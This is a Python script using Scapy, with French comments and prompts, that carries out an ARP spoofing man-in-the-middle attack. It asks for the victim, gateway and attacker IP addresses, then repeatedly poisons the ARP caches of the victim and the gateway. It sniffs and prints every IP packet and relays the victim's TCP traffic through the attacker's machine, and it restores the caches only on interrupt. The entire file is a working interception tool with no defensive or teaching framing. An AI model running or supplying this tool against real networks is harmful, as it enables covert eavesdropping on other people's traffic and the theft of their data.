import time
from scapy.all import ARP, getmacbyip, send, sniff, IP, Ether
from colorama import Fore, Style

def perform_arp_spoofing(victim_ip, spood_ip):
    """
    Objectif : Usurper l'adresse IP d'un hôte sur le réseau
    """
    victim_mac = getmacbyip(victim_ip)
    packet_arp = ARP(op=2, pdst=victim_ip, hwdst=victim_mac, psrc=spood_ip)
    send(packet_arp, verbose=False)
    print(f"{Fore.GREEN}[+] Table ARP Spoof pour {victim_ip}{Style.RESET_ALL}")

def restore(victim_ip, spood_ip):
    """
    Objectif : Rétablir le cache ARP d'un hôte sur le réseau
    """
    victim_mac = getmacbyip(victim_ip)
    spoof_mac = getmacbyip(spood_ip)
    packet = ARP(op=2, pdst=victim_ip, hwdst=victim_mac, psrc=spood_ip, hwsrc=spoof_mac)
    send(packet, verbose=False)
    print(f"{Fore.GREEN}[+] Cache ARP rétabli pour {victim_ip}{Style.RESET_ALL}")

def gestion_packet(packet):
    """
    Objectif : Gérer les paquets TCP de la victime et de la passerelle
    """
    global gateway_mac, gateway_ip, victim_ip
    if Ether in packet:
        if IP in packet:
            packet[IP].show()
            if "TCP" in packet:
                if packet[IP].src == victim_ip:
                    # Envoyer paquet de la victime vers la passerelle
                    packet[Ether].src = getmacbyip(spoofer_ip)  # Utilisez l'adresse MAC de l'attaquant
                    packet[Ether].dst = gateway_mac
                    packet[IP].src = victim_ip
                    packet[IP].dst = gateway_ip
                    send(packet, verbose=False)
                    return f"{Fore.GREEN}[+] Paquet de la victime vers la passerelle redirigé{Style.RESET_ALL}"
                
                elif packet[IP].src == gateway_ip:
                    # Envoyer paquet de la passerelle vers la victime
                    packet[Ether].src = getmacbyip(spoofer_ip)  # Utilisez l'adresse MAC de l'attaquant
                    packet[Ether].dst = getmacbyip(victim_ip)
                    packet[IP].src = gateway_ip
                    packet[IP].dst = victim_ip
                    send(packet, verbose=False)
                    return f"{Fore.GREEN}[+] Paquet de la passerelle vers la victime redirigé{Style.RESET_ALL}"

victim_ip = str(input("Entrez l'adresse IP de la victime : "))
gateway_ip = str(input("Entrez l'adresse IP de la passerelle : "))
spoofer_ip = str(input("Entrez l'adresse IP de l'attaquant : "))

print(f'Restauration du cache ARP de {victim_ip} et {gateway_ip}...')
restore(victim_ip, gateway_ip)
restore(gateway_ip, victim_ip)

gateway_mac = getmacbyip(gateway_ip)
if gateway_mac is None:
    print(f"{Fore.RED}[-] Impossible de joindre les hôtes{Style.RESET_ALL}")
    exit()
print(f"{Fore.YELLOW}[*] Adresse MAC de la passerelle : {gateway_mac}{Style.RESET_ALL}")
print(f"{Fore.YELLOW}[*] Attente de paquets TCP de la victime...{Style.RESET_ALL}")

#### EMPOISONNEMENT ARP + SNIFF####
try:
    while True:
        sniff_result = sniff(prn=gestion_packet, store=0, iface=None, timeout=1)
        if not sniff_result:
            perform_arp_spoofing(victim_ip, gateway_ip)
            time.sleep(1)
            perform_arp_spoofing(gateway_ip, victim_ip)
            time.sleep(1)
            
except KeyboardInterrupt:
    print(f"{Fore.RED}[-] Arrêt du programme{Style.RESET_ALL}")
    restore(victim_ip, gateway_ip)
    restore(gateway_ip, victim_ip)
